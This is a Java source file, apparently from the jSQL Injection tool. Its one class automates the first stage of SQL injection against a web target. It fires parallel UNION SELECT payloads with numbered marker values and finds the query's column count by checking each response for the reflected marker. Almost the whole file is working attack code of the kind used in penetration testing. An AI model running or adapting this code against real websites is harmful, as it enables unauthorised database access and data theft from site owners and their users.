package com.jsql.model;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.view.GUIMediator;

/**
 * Runnable class, search the correct number of fields in the SQL query.
 * Parallelizes the search, provides the stop capability
 */
public class StoppableGetInitialQuery extends Suspendable {
    @Override
    public String action(Object... args) throws PreparationException, StoppableException {
        // Parallelize the search
        ExecutorService taskExecutor = Executors.newCachedThreadPool();
        CompletionService<SimpleCallable> taskCompletionService = new ExecutorCompletionService<SimpleCallable>(taskExecutor);

        boolean requestFound = false;
        String selectFields, initialQuery = "";
        int selectIndex;

        // SQL: each field is built has the following 1337[index]7330+1
        // Search if the source contains 1337[index]7331, this notation allows to exclude
        // pages that display our own url in the source
        for (selectIndex = 1, selectFields = "133717330%2b1"; selectIndex <= 10; selectIndex++, selectFields += ",1337" + selectIndex + "7330%2b1") {
            taskCompletionService.submit(new SimpleCallable(GUIMediator.model().insertionCharacter + "+union+select+" + selectFields + "--+", Integer.toString(selectIndex)));
        }

        int total = 10;

        try {
            // Starting up with 10 requests, loop until 100
            while (!requestFound && total < 99) {
                // Breaks the loop if the user needs
                if (this.pauseShouldStopPause()) {
                    throw new StoppableException();
                }

                SimpleCallable currentCallable = taskCompletionService.take().get();

                // Found a correct mark 1337[index]7331 in the source
                if (Pattern.compile(".*1337\\d+7331.*", Pattern.DOTALL).matcher(currentCallable.content).matches()) {
                    GUIMediator.model().firstSuccessPageSource = currentCallable.content;
                    initialQuery = currentCallable.url.replaceAll("0%2b1", "1");
                    requestFound = true;
                    // Else add a new index
                } else {
                    selectIndex++;
                    selectFields += ",1337" + selectIndex + "7330%2b1";
                    taskCompletionService.submit(new SimpleCallable(GUIMediator.model().insertionCharacter + "+union+select+" + selectFields + "--+", Integer.toString(selectIndex)));
                    total++;
                }
            }
            taskExecutor.shutdown();
            taskExecutor.awaitTermination(15, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            InjectionModel.LOGGER.error(e, e);
        } catch (ExecutionException e) {
            InjectionModel.LOGGER.error(e, e);
        }

        if (requestFound) {
            return initialQuery.replaceAll("\\+\\+union\\+select\\+.*?--\\+$", "+");
        }
        return "";
    }
}